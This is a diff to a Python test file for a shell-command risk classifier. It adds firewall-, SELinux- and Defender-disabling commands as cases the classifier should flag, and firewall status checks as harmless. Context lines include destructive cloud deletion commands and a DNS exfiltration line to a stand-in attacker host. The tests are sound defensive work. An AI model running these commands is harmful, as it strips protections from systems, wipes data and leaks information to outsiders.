@@ -129,6 +129,13 @@ def test_catastrophic(line):
     "heroku apps:destroy --app x --confirm x",
     "firebase firestore:delete --all-collections",
     "bq rm -r -f dataset",
+
+    # Commands that switch off protection (#26)
+    "ufw disable",
+    "iptables -F",
+    "netsh advfirewall set allprofiles state off",
+    "setenforce 0",
+    "Set-MpPreference -DisableRealtimeMonitoring $true",
 ])
 def test_irreversible(line):
     assert kind(line) == "irreversible", commands.read(line).summary()
@@ -211,6 +218,12 @@ def test_no_false_alarm(line):
     "heroku apps:info",
     "firebase firestore:indexes",
     "bq ls",
+
+    # Checking firewall or security status (#26)
+    "ufw status",
+    "iptables -L",
+    "netsh advfirewall show allprofiles",
+    "getenforce",
 ])
 def test_everyday_work_is_not_held(line):
     assert kind(line) in ("other", "read_only"), commands.read(line).summary()
@@ -226,6 +239,7 @@ def test_summary_explains():
     assert "APFS" in commands.read("diskutil apfs deleteContainer disk2").summary()
     assert "backup" in commands.read("tmutil delete /Volumes/Backup/x").summary()
     assert "DNS name" in commands.read("nslookup $(whoami).attacker.example").summary()
+    assert "firewall" in commands.read("ufw disable").summary()
 
 
 @pytest.mark.parametrize("line", ["diskutil list", "diskutil info disk2", "diskutil apfs list",
